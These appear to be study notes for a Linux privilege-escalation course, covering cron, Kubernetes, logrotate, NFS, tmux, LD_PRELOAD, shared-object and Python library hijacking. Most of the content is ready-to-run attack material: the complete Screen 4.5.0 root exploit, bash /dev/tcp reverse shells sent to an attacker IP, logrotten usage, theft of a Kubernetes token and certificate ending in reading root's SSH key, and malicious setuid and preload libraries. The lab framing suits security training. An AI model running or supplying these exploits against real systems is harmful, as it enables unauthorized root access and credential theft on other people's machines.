**Screen 4.5.0** has a local privilege-escalation vulnerability caused by improper permission checks when creating log files. In an authorized lab, check the version first and, if vulnerable, use the PoC.

## 1. Check Screen Version

```
screen -v
```

Vulnerable version:

```
Screen 4.05.00
```

## 2. Run the PoC

```bash

#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```

Save the provided exploit as:

```
screen_exploit.sh
```

Then:

```
chmod +x screen_exploit.sh
./screen_exploit.sh
```

The exploit creates a malicious shared library, abuses `/etc/ld.so.preload`, and creates a root shell.

## 3. Root Shell

After the exploit finishes:

```
/tmp/rootshell
```

Check privileges:

```
id
```

---
---

# Section 13 - Cron Job Abuse

**Cron jobs** automatically run commands or scripts on a schedule. For privilege escalation, the important case is when a **root cron job runs a script or command that your user can modify**. `crontab` creates scheduled jobs that the **cron daemon** runs automatically. Each entry has **6 fields** in this order: **minute, hour, day, month, weekday, command**. For example, `0 */12 * * * /home/admin/backup.sh` runs `backup.sh` every 12 hours. User cron files are typically stored under `/var/spool/cron/`.

## Option 1 — Find Cron Files and Writable Scripts

First, look for files that your user can modify:

```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

Then check cron configuration files:

```bash
crontab -l
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/
```

Find cron files and check their permissions:

```bash
find /etc/cron* -type f -exec ls -l {} \; 2>/dev/null
```

Look for a **writable script or cron file that is executed as root**. For example:

```bash
ls -la /dmz-backups/
```

If you find a writable script such as:

```text
/dmz-backups/backup.sh
```

check its contents:

```bash
cat /dmz-backups/backup.sh
```


## Option 2 — Use `pspy`

If you **cannot read the root crontab** or you are unsure which cron job is running, use `pspy` to watch processes without root privileges:

```bash
./pspy64 -pf -i 1000
```

Important options:

```text
-pf      → show process and filesystem events
-i 1000  → check every 1000 milliseconds
```

Look for:

```text
UID=0
```

and commands that execute scripts you can modify.

### How to Know When a Cron Job Runs

If `pspy` is unavailable, first check the cron configuration to find the schedule. If the job is inside `/etc/cron.daily/`, check `/etc/anacrontab` (`anacron` is used to run periodic jobs such as daily, weekly, or monthly tasks):

```bash
cat /etc/anacrontab
```

If `anacron` is not available, check files created by the script. For example:

```bash
ls -lt /dmz-backups/
```

If backup files appear at `08:44`, `08:46`, `08:48`, `08:50`, etc., the script is running **every 2 minutes**. This lets you determine the execution interval from existing files instead of waiting for the next run.

## Exploit a Writable Root Script

If you find a script that:

- runs as `root`
- is writable by your user
- is executed by cron

make a backup first:

```bash
cp /dmz-backups/backup.sh /tmp/backup.sh.bak
```

Then, in an authorized lab, append your command, a one liner reverse shell:

```bash

echo 'bash -i >& /dev/tcp/<ATTACK_IP>/<PORT> 0>&1' >> /dmz-backups/backup.sh
```

Start a listener on the Attack Machine:

```bash
nc -lnvp <PORT>
```

Wait for cron to execute the script. Verify your privileges:

```bash
id
hostname
```


---
---

# Section 16 - Kubernetes (K8s)


- **Kubernetes (K8s)** = a tool that **manages lots of containers** across many machines (an "orchestrator"). Docker _runs_ containers; K8s _organizes and scales_ them.
- **Pod** = the smallest unit. A pod holds one or more containers and acts like its own little machine (own IP, hostname). Your apps run inside pods.
- Built by Google, now the industry standard for running containers at scale.

### Docker vs Kubernetes

Docker is the tool that actually builds and runs a single container — think of it as the thing that bakes one cake. But real apps need many containers running across many machines, and someone has to decide where each one runs, restart them when they crash, scale them up when traffic spikes, and connect them together. That's Kubernetes — the manager (or "orchestrator") that bosses lots of containers around. So they're not rivals: Docker makes and runs the containers; Kubernetes organizes and babysits them at scale. Docker is one chef; Kubernetes is the restaurant manager running a whole kitchen of chefs.

### The two parts of a cluster

|Part|Also called|Job|
|---|---|---|
|**Control Plane**|master node|The brain — decides and controls everything|
|**Worker Nodes**|minions|The muscle — actually run the pods/apps|

## Key ports (what runs where)

These are the services on the **Control Plane**. In a pentest you scan for these to know what you're dealing with.

|Service|Port(s)|What it is|
|---|---|---|
|**etcd**|2379, 2380|The database storing the whole cluster state|
|**API server**|6443|Main entry point — all commands go here|
|**Scheduler**|10251|Decides which node a new pod runs on|
|**Controller Manager**|10252|Keeps the cluster in its desired state|
|**Kubelet API**|10250|Agent on each node — **our main attack target**|
|**Read-Only Kubelet API**|10255|Read-only version of the Kubelet|

> **Remember:** `6443` = API server (the boss). `10250` = Kubelet (the weak spot we abuse).


## How it fits together (one paragraph)

You talk to the cluster through the **API server (6443)**, usually with the `kubectl` tool. The API server stores everything in **etcd**. The **Scheduler** picks which worker node runs a pod, and the **Kubelet (10250)** is the agent on each node that actually starts containers. The security problem: **the Kubelet often allows anonymous (no-login) access by default** — so if we can reach port 10250, we can list pods and even run commands inside them without any credentials.

---

# Kubernetes Privilege Escalation (exam part)

**The whole approach in one line:** _Reach the Kubelet (10250) → run commands in a pod → steal that pod's token + certificate → check what you're allowed to do → if you can create pods, make an evil pod that mounts the host's disk → read host root's files._

## Step-by-step attack

### Step 1 — Poke the API server (6443)

See if anonymous access is allowed. A **403 Forbidden** means it's locked down (normal).

```
cry0l1t3@k8:~$ curl https://10.129.10.11:6443 -k
```

```
{  "status": "Failure",  "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",  "reason": "Forbidden",  "code": 403}
```

> `system:anonymous` = you with no login. 403 = denied. So we pivot to the **Kubelet** instead.

### Step 2 — List pods via the Kubelet (10250)

The Kubelet often answers anonymous requests. Ask it for the pod list.

```
cry0l1t3@k8:~$ curl https://10.129.10.11:10250/pods -k | jq .
```

This reveals pod names, namespaces, and container images — useful for finding known vulnerabilities and sometimes leaking secrets in the config.

### Step 3 — Same thing, cleaner, with `kubeletctl`

`kubeletctl` is a dedicated tool that makes Kubelet attacks easy.

```
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 pods
```

Gives a neat table of pods, namespaces, and containers (e.g. pod `nginx`, container `nginx`).

### Step 4 — Find which pods let you run commands (RCE)

```
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 scan rce
```

A `+` in the **RCE** column = you can run commands in that pod (e.g. `nginx` = `+`).

### Step 5 — Run a command inside a vulnerable pod

Check what privileges you have inside it.

```
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
```

```
uid=0(root) gid=0(root) groups=0(root)
```

> `-p nginx` = pod name, `-c nginx` = container name. Output shows **root inside the container** — great starting point.

### Step 6 — Steal the service account TOKEN

Every pod carries a token that proves its identity to the cluster. Grab it.

```
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
```

(Saves the token into a file `k8.token`.)

### Step 7 — Steal the CERTIFICATE (ca.crt)

```
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
```

(Saves the CA certificate into `ca.crt`. You now have both pieces to authenticate as that pod.)

### Step 8 — Check what the stolen identity can DO

Now talk to the API server (6443) **as that pod** and ask "what am I allowed to do?"

```
cry0l1t3@k8:~$ export token=`cat k8.token`cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
```

Look at the output. If you see **pods → `get create list`**, that's the jackpot — you can **create new pods**.

### Step 9 — Write an evil pod file that mounts the HOST disk

Because you can create pods, make one that bolts the host's entire filesystem (`/`) into the pod at `/root`. Save as `privesc.yaml`:

```
apiVersion: v1kind: Podmetadata:  name: privesc  namespace: defaultspec:  containers:  - name: privesc    image: nginx:1.14.2    volumeMounts:    - mountPath: /root      name: mount-root-into-mnt  volumes:  - name: mount-root-into-mnt    hostPath:       path: /  automountServiceAccountToken: true  hostNetwork: true
```

> The key line is `hostPath: path: /` — it mounts the **whole host** into the pod (same core trick as Docker's `-v /:/...`).

### Step 10 — Create the evil pod and confirm it's running

```
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
```

```
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
```

Wait until `privesc` shows `Running`.

### Step 11 — Read host root's SSH key (game over)

The host's `/` is now inside the pod at `/root`, so the host's real `/root` is at `/root/root`.

```
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```

```
-----BEGIN OPENSSH PRIVATE KEY-----...SNIP...
```

> Take this key → SSH into the host as root. Done.


**Core idea (same as Docker):** get the ability to create a container/pod → mount the host's `/` → read host files as root.

---
---

# Section 17 -  Logrotate


- **logrotate** = a Linux tool that manages log files in `/var/log` — it archives/compresses/deletes old logs so they don't fill the disk.
- It runs automatically via **cron**, usually **as root**.
- **Why we care:** it runs as root and acts on log files. If we can write to a log it rotates, we trick it into running our code **as root**.
### Requirements (all 3 must be true)

| #   | Requirement                                               | How to check it                                          |
| --- | --------------------------------------------------------- | -------------------------------------------------------- |
| 1   | We can **write** to a log file                            | `find /var/log /tmp -writable -type f 2>/dev/null`       |
| 2   | logrotate runs as **root**                                | `ls -la /etc/cron.daily/logrotate` (root's cron runs it) |
| 3   | **Vulnerable version** (3.8.6 / 3.11.0 / 3.15.0 / 3.18.0) | `logrotate --version`                                    |

### Key files

| File                        | Command                              | What it tells you                                                       |
| --------------------------- | ------------------------------------ | ----------------------------------------------------------------------- |
| `/etc/logrotate.conf`       | `cat /etc/logrotate.conf`            | Global settings + `create`/`compress` option (→ your exploit mode)      |
| `/etc/logrotate.d/*`        | `cat /etc/logrotate.d/*`             | Per-service configs (override global) + **which logs rotate** = targets |
| `/var/lib/logrotate.status` | `sudo cat /var/lib/logrotate.status` | **When** each log last rotated                                          |

**Status file** — each line is `logfile last-rotated-date`:

```
"/var/log/samba/log.smbd" 2022-8-3"/var/log/mysql/mysql.log" 2022-8-3
```

**Service config** — e.g. `/etc/logrotate.d/dpkg`:

```
/var/log/dpkg.log {        monthly        rotate 12        compress        create 644 root root}
```

→ Rotate `dpkg.log` monthly, keep 12 copies, `compress`, and `create` a new one owned by **root**. The `create`/`compress` word is the mode you give the exploit.

---

## Attack

### Step 1 — Find your target log + confirm the mode

Find a log you can write to (Requirement #1), then see the rotation mode:

```
logger@nix02:~$ find /var/log /tmp -writable -type f 2>/dev/null
logger@nix02:~$ grep "create|compress" /etc/logrotate.conf | grep -v "#"create
```

> Mode decides the exploit flag: `create` = default, `compress` = add `-c`. (If neither shows, check `/etc/logrotate.d/*`; still nothing → try `create` first.)

### Step 2 — Download & compile the exploit

```
logger@nix02:~$ git clone https://github.com/whotwagner/logrotten.git
logger@nix02:~$ cd logrotten && gcc logrotten.c -o logrotten
```

If you cant download it on target, do `scp -r /home/htb-ac-1094410/logrotten htb-student@10.129.204.41:/home/htb-student/`, ( `-r` for sending a directory). Then compile the file there.
### Step 3 — Make the payload (reverse shell with your IP + port)

```
logger@nix02:~$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

### Step 4 — Start a listener on your box

```
noobjb@htb[/htb]$ nc -nlvp 9001
```

### Step 5 — Run the exploit against the writable log

Use the path from Step 1 (lab example: `/var/log/dpkg.log`). Add `-c` if the mode was `compress`:

```
logger@nix02:~$ cd logrotten
logger@nix02:~$ ./logrotten -p ./payload /var/log/dpkg.log
```

### Result — root shell when the log rotates

```
Connection received on 10.129.24.11 49818# iduid=0(root) gid=0(root) groups=0(root)
```

---

## Optional — force a rotation now (don't wait for cron)

logrotate only rotates when the stored date is **old enough**, so make it look overdue (needs access to the status file, which is root-owned):

```

logger@nix02:~$ sudo nano /var/lib/logrotate.status# change:  "/tmp/tmp.log" 2026-10-4   →   "/tmp/tmp.log" 2025-1-1
```

Or force it directly if you can run logrotate:

```
logger@nix02:~$ logrotate -f /etc/logrotate.conf
```

> ⚠️ Setting the date to **today** does the opposite (tells it "already done"). Always set it **back** to force a rotation.


**Core idea:** logrotate runs as root → write to a log it rotates → plant a payload → root shell on rotation.

---
---

# Section 18 - Miscellaneous Techniques

These are additional Linux privilege-escalation techniques to check when the usual methods do not work. The main ones here are **passive traffic capture, weak NFS permissions, and hijacking privileged tmux sessions**.

## 1. Passive Traffic Capture

If you can capture network traffic, you may find **cleartext credentials, hashes, or other sensitive information**. Tools such as `tcpdump`, `net-creds`, and `PCredz` can help inspect captured traffic.

|Step|Command|Description|
|---|---|---|
|**1. Check tcpdump**|`which tcpdump`|Check whether `tcpdump` is installed.|
|**2. Capture traffic**|`sudo tcpdump -i any -w capture.pcap`|Capture network traffic and save it to `capture.pcap`.|
|**3. Inspect traffic**|`tcpdump -r capture.pcap`|Read the captured packets.|
|**4. Look for credentials**|`net-creds -p capture.pcap`|Search captured traffic for credentials and other useful information.|
|**5. Use PCredz**|`Pcredz -f capture.pcap`|Look for credentials and authentication material in the capture.|

Look especially for cleartext protocols such as:

```text
HTTP, FTP, POP, IMAP, Telnet, SMTP
```

You may also find:

```text
Net-NTLMv2, SMBv2, Kerberos hashes, SNMP community strings
```

---

# 2. Weak NFS Privileges

**NFS** allows Linux/Unix systems to share directories over the network. NFS commonly uses **port 2049**. The dangerous configuration is:

```text
no_root_squash
```

This means a remote root user can create files on the NFS share that remain **owned by root**. This can be abused to place a SUID binary on the share.

| Step                             | Command                                   | Description                                                                                                                                 |
| -------------------------------- | ----------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
| **1. Find NFS exports**          | `showmount -e <TARGET_IP>`                | Show directories that the NFS server exports.                                                                                               |
| **2. Check exports**             | `cat /etc/exports`                        | If you have access to the NFS server, check how the shares are configured.                                                                  |
| **3. Look for dangerous option** | `no_root_squash`                          | This allows remote root to create root-owned files on the NFS share.                                                                        |
| **4. Create a shell program**    | `cat shell.c`                             | Create a small program that starts `/bin/bash` with UID/GID 0.                                                                              |
| **5. Compile it**                | `gcc shell.c -o shell`                    | Compile the program into an executable.                                                                                                     |
| **6. Mount the NFS share**       | `sudo mount -t nfs <TARGET_IP>:/tmp /mnt` | Mount the vulnerable NFS share on your machine. `mount` means **make the remote `/tmp` share accessible through your local `/mnt` folder**. |
| **7. Copy the binary**           | `cp shell /mnt`                           | Copy the compiled binary to the NFS share.                                                                                                  |
| **8. Set SUID**                  | `chmod u+s /mnt/shell`                    | Set the SUID bit so the binary runs with its owner's privileges.                                                                            |
| **9. Run it from the target**    | `./shell`                                 | Execute the SUID binary from the target machine.                                                                                            |
| **10. Confirm privileges**       | `id`                                      | Check whether the shell is running as `root`.                                                                                               |

### Shell program

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

### Important NFS options

|Option|Meaning|
|---|---|
|`root_squash`|Remote root is mapped to an unprivileged user such as `nfsnobody`.|
|`no_root_squash`|Remote root remains root when creating files on the NFS share. **This is dangerous.**|

---

# 3. Hijacking Tmux Sessions

`tmux` allows users to keep terminal sessions running in the background. If a **root tmux session** is accessible to your user, attaching to it can give you a root shell.

|Step|Command|Description|
|---|---|---|
|**1. Find tmux processes**|`ps aux \| grep tmux`|Look for running tmux sessions, especially sessions owned by `root`.|
|**2. Check the tmux socket**|`ls -la /shareds`|Check who owns the tmux socket and which group can access it.|
|**3. Check your groups**|`id`|See whether you belong to the group that owns the tmux socket.|
|**4. Attach to the session**|`tmux -S /shareds`|Connect to the tmux session using its socket.|
|**5. Check privileges**|`id`|If the session belongs to root, you may now have a root shell.|

### Example

A existing root tmux process might look like:

```text
root  4806 ... tmux -S /shareds new -s debugsess
```

The socket might be:

```text
srw-rw---- 1 root devs 0 /shareds
```

If your user belongs to `devs`:

```text
groups=... devs
```

you may be able to attach:

```bash
tmux -S /shareds
```

Then:

```bash
id
```

If the session is running as root:

```text
uid=0(root) gid=0(root)
```


---
---

# Section 19 - Kernel Exploitation

If the kernel is old and vulnerable, a kernel exploit may provide another privilege-escalation path. First identify the kernel and Linux OS:

```bash
uname -a
cat /etc/lsb-release
```

Then check whether the kernel version and system configuration actually match a known exploit. If an applicable exploit is available, it may need to be compiled:

```bash
gcc kernel_expoit.c -o kernel_expoit && chmod +x kernel_exploit
```

Kernel exploits should generally be considered **after easier privilege-escalation paths have been checked**.

---
---

# Section 20 - Shared Libraries / `LD_PRELOAD`


Linux programs often use **libraries** so they can reuse existing code instead of containing everything inside the program.

|Type|Extension|Simple meaning|
|---|---|---|
|Static library|`.a`|Code is included inside the program when compiled.|
|Shared library|`.so`|Loaded when the program runs and can potentially be replaced/controlled.|

## Finding Shared Libraries

`ldd` shows which shared libraries a program uses and where they are located.

```bash
ldd /bin/ls
```

Example:

```text
libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1
libc.so.6      => /lib/x86_64-linux-gnu/libc.so.6
```

So you can see both the **library name** and its **path**.

## Where Linux Looks for Libraries

Shared libraries can be located through:

```text
-rpath / -rpath-link
LD_RUN_PATH
LD_LIBRARY_PATH
/lib
/usr/lib
/etc/ld.so.conf
```

The important one for privilege escalation is:

```text
LD_PRELOAD
```

---

## LD_PRELOAD

`LD_PRELOAD` tells Linux to **load a specified shared library before the normal libraries**. Because the preloaded library gets loaded first, its functions can override normal library functions. For privilege escalation, the important question is:

> **Can I run a program as root with `sudo` while keeping `LD_PRELOAD`?**

Check:

```bash
sudo -l
```

Look for something like:

```text
env_keep+=LD_PRELOAD
```

and a command I can run as root:

```text
(root) NOPASSWD: /usr/sbin/apache2 restart
```

This means: Apache itself isn't a GTFOBins shortcut, and sudo only allows the exact Apache path, so normally you can't turn that permission into a root shell. But because `LD_PRELOAD` is preserved, you can use the shared-library mechanism to make the root Apache process load your code


### Create the Malicious Library

Create:

```bash
nano root.c
```

Use:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

`unsetenv("LD_PRELOAD")` removes the variable after the library has loaded so it does not keep affecting child processes.

### Compile the Library

```bash
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

|Option|Meaning|
|---|---|
|`-fPIC`|Create position-independent code.|
|`-shared`|Create a shared library (`.so`).|
|`-o root.so`|Name the output `root.so`.|
|`-nostartfiles`|Compile without the normal startup files; useful for this `_init()` library.|

### Run It With `sudo`

Make sure you use the **full path** to the library:

```bash
sudo LD_PRELOAD=/path-to-file/root.so /usr/sbin/apache2 restart
```

Because `apache2` is being executed as root, the preloaded library also runs with root privileges. Check:

```bash
id
```

If successful, You now have a root shell.

---
---

# Section 21 - Shared Object Hijacking


**Shared Object Hijacking** happens when a **privileged program** loads a `.so` library from a directory that normal users can modify. A privileged program is a program that runs with **higher privileges than your current user**, such as a **SUID program that runs as root**. If you can replace the library, the program may execute your code with those higher privileges.

## 1. Find a SUID Binary

```bash
find / -user root -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
```

If you see:

```text
-rwsr-xr-x 1 root root ... payroll
```

the `s` means **SUID**, so `payroll` runs with the owner's privileges, which in this case is root.

## 2. Check Its Libraries

```bash
ldd /path-to/payroll
```

Look for a custom library such as:

```text
libshared.so => /development/libshared.so
```

This tells you that `payroll` needs a library called `libshared.so` and expects to find it in `/development`. **But Don't search for only `libshared.so`. Search for SUID binaries that load libraries from writable locations.**

## 3. Check RUNPATH

```bash
readelf -d /path-to/payroll | grep PATH
```

If you see:

```text
(RUNPATH) Library runpath: [/development]
```

the binary searches `/development` for its libraries. Now check whether you can write there:

```bash
ls -la /development/
```

If the directory is writable by your user, you may be able to place your own `libshared.so` there.

## AUTOMATION: Optional to 1, 2 and 3

You can automate it so it **only shows SUID binaries where a library is loaded from a directory that your current user can write to**

```bash
find / -user root -perm -4000 -type f 2>/dev/null | while read bin; do
    while read lib; do
        dir=$(dirname "$lib")
        if [ -w "$dir" ]; then
            echo "===== SUID: $bin ====="
            echo "Writable library directory: $dir"
            echo "Library: $lib"
            readelf -d "$bin" 2>/dev/null | grep -E 'RPATH|RUNPATH'
            echo
        fi
    done < <(ldd "$bin" 2>/dev/null | awk '/=> \// {print $3}')
done
```

## 4. Find Which Function the Binary Needs

Here, we temporarily copy an existing library to the expected filename so the program can start loading it and tell us which function it is missing. You can take a library from the findings of `ldd payroll` and copy to the runpath. You **do not copy a random library because you need that library's functions**. For example:

```bash
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
```

Then go to the binary's directory and run:

```bash
./payroll
```

If you get:

```text
undefined symbol: dbquery
```

this tells you that `payroll` expects a function called:

```text
dbquery()
```

The copied `libc.so.6` was only a **temporary test**. It is not the library you ultimately want to use.

## 5. Create Your Own Library

Create:

```bash
nano src.c
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```

The important part is:

```c
void dbquery()
```

because the `payroll` program expects a function with that name. When `payroll` calls `dbquery()`, your version of the function runs.

## 6. Compile the Library

```bash
gcc src.c -fPIC -shared -o /development/libshared.so
```

This creates your own:

```text
/development/libshared.so
```

Now the library at the location expected by `payroll` is your malicious library.

## 7. Run the SUID Binary

```bash
./payroll
```

Because `payroll` is **SUID root**, it runs with root privileges. When it loads `/development/libshared.so` and calls `dbquery()`, your code executes with those privileges.

Check:

```bash
id
```

If successful:

```text
uid=0(root)
```

---
---

# Section 22 - Python Library Hijacking

## The idea 

A Python script you can run **as root** (via sudo/SUID) `import`s a module. If you can control **what gets imported**, your code runs as root. You attack the _module_, not the script.

## The 3 attack vectors

| #        | Vector                         | What's misconfigured                              | You win when…                                          |
| -------- | ------------------------------ | ------------------------------------------------- | ------------------------------------------------------ |
| Option 1 | **Insecure Write Permissions** | The module `.py` file is writable by you          | You edit the real module, add your code                |
| Option 2 | **Library Search Path**        | A _higher-priority_ search dir is writable by you | You drop a fake module there; Python loads yours first |
| Option 3 | **PYTHONPATH Env Variable**    | sudo rule has `SETENV:` for python                | You point PYTHONPATH at your own dir                   |


## METHODOLOGY (do this every time)

1. **Check sudo rights:** `sudo -l` → find a python script you can run as root (or a `SETENV:` rule).
2. **Read the script:** note which **module** it imports and which **function** it calls.
3. **Locate the module:** `pip3 show <module>` → gives its install path.
4. **Pick the vector** based on what you can write:
    - Module file writable? → **Option 1**
    - A higher-priority search-path dir writable? → **Option 2**
    - sudo rule has `SETENV:`? → **Option 3**
5. **Inject your payload** into the hijacked function (keep the **same name + same arguments**).
6. **Run the script with sudo** → code executes as root. Test with `id` first, then swap in a reverse shell.

> **Golden rule for vectors 2 & 3:** your fake module must have the **same filename** as the import and the **same function name/signature** as the one the script calls — or it fails.

---

## WORKED EXAMPLE

Script `mem_status.py` imports **`psutil`** and calls **`virtual_memory()`**.

### Setup — recon (shared by all vectors)

```
# 1. sudo rights — 
we can run this script as root, no password
htb-student@lpenix:~$ sudo -l    (ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py

# 2. read the script — 
it imports psutil, 
calls virtual_memory()htb-student@lpenix:~$ cat mem_status.pyimport psutilavailable_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

# 3. find where psutil lives
htb-student@lpenix:~$ pip3 show psutil
Location: /usr/local/lib/python3.8/dist-packages
```

> Note: SUID on a `.py` script is **ignored** by Linux — only SUID on `/usr/bin/python3` itself would count. So we rely on **sudo**, not SUID.

---

### Option 1 — Insecure Write Permissions

Check if the module file is writable:

```
htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

-rw-r--rw- 1 root staff 87339 ... __init__.py     # <-- 'w' for others = writable!
```

Edit that file and inject code at the **start of `virtual_memory()`**:

```
def virtual_memory():    
import os    
os.system('id')          # test payload (swap for reverse shell later)    ...
```

Run as root:

```
htb-student@lpenix:~$ sudo /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
```

---

### Option 2 — Library Search Path

Python searches dirs **in priority order**; a higher one wins. List them:

```
htb-student@ubuntu:~$ pip3 show psutil
Location: /usr/local/lib/python3.8/dist-packages


htb-student@lpenix:~$ python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python3.8  <---------
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages <--------
/usr/lib/python3/dist-packages 

# higher priority /usr/lib/python3.8         
# where psutil really is (lower)
```

**Need:** real module is in a _lower_ path **AND** a _higher_ path is writable:

```
htb-student@lpenix:~$ ls -la /usr/lib/python3.8
drwxr-xrwx 30 root root ...     # <-- world-writable, and higher priority!
```

Create a fake module there — **same name** `psutil.py`, **same function** `virtual_memory()`:

```
echo 'import os
def virtual_memory():
    os.system("id")' > psutil.py
```

Run as root → Python finds _your_ psutil first:

```
htb-student@lpenix:~$ sudo /usr/bin/python3 mem_status.py

uid=0(root) gid=0(root) groups=0(root)
```

> A traceback after `id` runs is fine — your code already executed.

---

### Option 3 — PYTHONPATH Environment Variable

Check sudo rule allows setting env vars (`SETENV:`):

```
htb-student@lpenix:~$ sudo -l    
(ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

Put your fake `psutil.py` in any dir (e.g. `/tmp`), then point PYTHONPATH there when running:

```
htb-student@lpenix:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ~/mem_status.py

uid=0(root) gid=0(root) groups=0(root)
```

> `PYTHONPATH=/tmp/` forces Python to search `/tmp` for modules → loads your malicious `psutil`.

---

**Core idea:** a root-run script imports a module → if you control the module (edit it / outrank it on the path / redirect PYTHONPATH), your code runs as root. Always test with `id`, then swap in a reverse shell.

## Question

The HTB forum says: 


```

As mentioned by others above, none of the directories listed in the tutorial are writable by the htb-student user. You also do not get SETENV permissions with sudo. You also do not have write access to the **init**.py script in the psutil folder. Given all of that, you cannot actually do any single one of the things listed in the writeup.

The solution:  
There is one other directory that the script will apparently check for psutil in the directory that mem_status.py resides in. Create a new psutil.py, and run the program with sudo.
```


so Do: 

```
htb-student@ubuntu:~$ echo 'import os                                      
def virtual_memory():
    os.system("cat /root/flag.txt")' > psutil.py
    
htb-student@ubuntu:~$ sudo /usr/bin/python3 /home/htb-student/mem_status.py
HTB{..............}

```

### EXPLAINATION

When you run a Python script, Python builds a **search list** of folders to look in when it hits an `import`. The **first folder on that list is always the folder the script itself is in.** It checks that one before anything else.

**See it yourself:**
```bash
python3 -c 'import sys; print(sys.path)'
```

If your script is at `/home/htb-student/`, the list looks like:
```
['/home/htb-student',                          ← position 0: the script's folder (checked FIRST)
 '/usr/lib/python3.8',
 '/usr/lib/python3.8/lib-dynload',
 '/usr/local/lib/python3.8/dist-packages',     ← the REAL psutil lives here
 '/usr/lib/python3/dist-packages']
```

**Now the example:**

The script does `import psutil`. Python walks the list top to bottom and stops at the **first** `psutil` it finds:

| Order | Folder checked | psutil here? |
|-------|----------------|--------------|
| 1st | `/home/htb-student` ← **the script's folder** | *(normally no)* |
| 2nd | `/usr/lib/python3.8` | no |
| … | … | … |
| 4th | `/usr/local/lib/.../dist-packages` | ✅ the real one |

Normally there's no psutil in folder 1, so Python keeps going and loads the real one in folder 4.

**The attack:** you put your own fake `psutil.py` in folder 1 (`/home/htb-student`) — the same place as `mem_status.py`:

```bash
echo 'import os
def virtual_memory():
    os.system("id")' > /home/htb-student/psutil.py
```

Now the table becomes:

| Order | Folder checked | psutil here? |
|-------|----------------|--------------|
| 1st | `/home/htb-student` | ✅ **YOUR fake one** — stops here! |
| 4th | `/usr/local/lib/.../dist-packages` | (never reached) |

Python finds **yours first**, imports it, and runs your `virtual_memory()` instead of the real one. Run it as root:

```bash
sudo /usr/bin/python3 /home/htb-student/mem_status.py
```

→ `uid=0(root)` — your code executed as root.

Your mental checklist for these:

1. `sudo -l` → find the root-run script + the module it imports
2. Try the 3 taught vectors (file writable? higher path writable? `SETENV`?)
3. **If all fail →** can I write to the **script's own directory**? → drop fake module next to it 


---
---

# Section 23 - SUDO


`sudo` allows a user to run a command with another user's privileges, usually `root`. The `/etc/sudoers` file defines **which users/groups can run which programs and with what privileges**. For example:

```bash
sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
```

A rule such as:

```text
cry0l1t3 ALL=(ALL) /usr/bin/id
```

means `cry0l1t3` is allowed to run `/usr/bin/id` with `sudo`.

## Attack Path 1 — CVE-2021-3156

